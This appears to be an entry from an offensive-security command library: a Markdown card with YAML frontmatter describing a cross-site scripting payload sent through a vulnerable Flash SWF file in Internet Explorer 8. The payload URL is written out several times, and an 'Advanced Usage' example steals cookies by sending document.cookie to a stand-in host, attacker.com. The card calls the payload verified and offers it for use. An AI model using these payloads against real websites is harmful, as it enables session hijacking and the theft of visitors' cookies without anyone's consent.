---
type: command
executor: browser
data: >-
  http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){
  window.open('?js=history.go(-1)','-self');}
tags:
  - xss
  - swf-flash
  - ie8
platforms:
  - web
  - browser
verified: true
validated: true
---

# xss-swf-payload-ie8

## Command

Visit the following URL in Internet Explorer 8:

```
http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open('?js=history.go(-1)','-self');}
```

## Description

This command delivers an XSS payload tailored for IE8, using try-catch to handle potential JS execution errors in Flash contexts, falling back to a page redirect if the primary payload fails.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| js | JavaScript code wrapped in try-catch for injection | Yes |
| fallback | Error handling action (e.g., window.open for redirect) | Yes |
| SWF URL base | Base URL of the vulnerable SWF file | Yes |

## Examples

### Basic Usage

```
http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open('?js=history.go(-1)','-self');}
```

### Advanced Usage (Cookie Theft)

```
http://0me.me/demo/xss/xssproject.swf?js=try{new Image().src='http://attacker.com/?c='+document.cookie;}catch(e){history.go(-1);}
```

## Expected Output

An alert dialog shows the document domain if successful, or the page redirects to the previous history entry if the JS throws an error. Network logs may show exfiltrated data.

## Related

- [[procedures/Exploit-XSS-in-SWF-Flash-Application]]
